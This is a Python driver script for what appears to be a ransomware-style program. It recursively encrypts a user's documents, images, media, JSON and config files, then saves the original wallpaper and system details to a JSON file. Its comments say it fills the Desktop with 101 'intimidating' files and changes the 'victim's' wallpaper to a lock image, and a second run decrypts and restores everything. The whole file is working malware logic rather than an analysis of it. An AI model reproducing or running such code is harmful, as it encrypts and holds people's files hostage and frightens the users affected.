from cryptography.fernet import Fernet
from CryptoApp import CryptoApp
import os
import json
from operator import itemgetter
import glob
from sys import argv



# Get the starting path
# Otherwise start from the current directory
try:
    START_PATH = argv[1] if os.path.isdir(argv[1]) else os.getcwd()
except IndexError:
    START_PATH = os.getcwd()


# Variables that must be initialized before CryptoApp constructor
JSON_PATH = 'info.json'
lock_wallpaper = os.path.realpath('locked.jpg')

# Init the APP, do not encrypt these files specified in a constructor
APP = CryptoApp(START_PATH)

# Set the initial options
APP.setFilesToSkip([JSON_PATH, '__pycache__', 'locked.jpg'])
APP.setExtensionsToModify([
    '.txt', '.docx', '.odt',
    '.jpg', '.png', '.jpeg', '.gif',
    '.mp3', '.mp4', '.avi', 
    '.json', '.conf'
])

# Init the variables
target_os, target_de = itemgetter('os', 'de')(APP.determineOS())
new_wallpaper = None
extra_files_name = 'Hello_lock'
desktop_path = os.path.expanduser('~/Desktop')



if APP.isAlreadyEncrypted():
    # Remove every extra file that was created during encryption (on desktop)
    for file in glob.glob(f'{desktop_path}/{extra_files_name}*.txt'):
        try: os.remove(file)
        except: continue

    APP.decrypt()

    # If decrypted successfully, handle the JSON file
    if os.path.isfile(JSON_PATH):

        # Parse the JSON file
        json_file = APP.readFile(JSON_PATH)
        to_dict = json.loads(json_file)

        if 'original_background' in to_dict:
            # Set the wallpaper variable
            new_wallpaper = to_dict["original_background"]

        # Remove the JSON file
        os.remove(JSON_PATH)

else:
    # Encrypt, and get the number of total modified files and directories
    APP.encrypt()
    dirs_num, files_num = itemgetter('dirs', 'files')(APP.getCount()) 

    # Save some informations to a JSON file
    asJSON = {}
    asJSON['os'] = target_os
    asJSON['de'] = target_de
    asJSON["status"] = 'encrypted'
    asJSON["directories"] = dirs_num
    asJSON["files_modified"] = files_num

    # Get the current wallpaper
    currentBG = APP.getDesktopBG(target_os, target_de)
    if currentBG:
        # And save it
        asJSON["original_background"] = currentBG
    
    # Locked screen wallpaper
    if os.path.isfile(lock_wallpaper):
        new_wallpaper = lock_wallpaper

    # Create and save the JSON
    j = json.dumps(asJSON, indent=4)
    APP.writeFile(JSON_PATH, j)

    # Create on Desktop some intimidating files
    for i in range(0, 101):
        APP.writeFile(f'{desktop_path}/{extra_files_name}{i}.txt', 'Hello')


# Change the victim's wallpaper
APP.setDesktopBG(target_os, target_de, new_wallpaper)



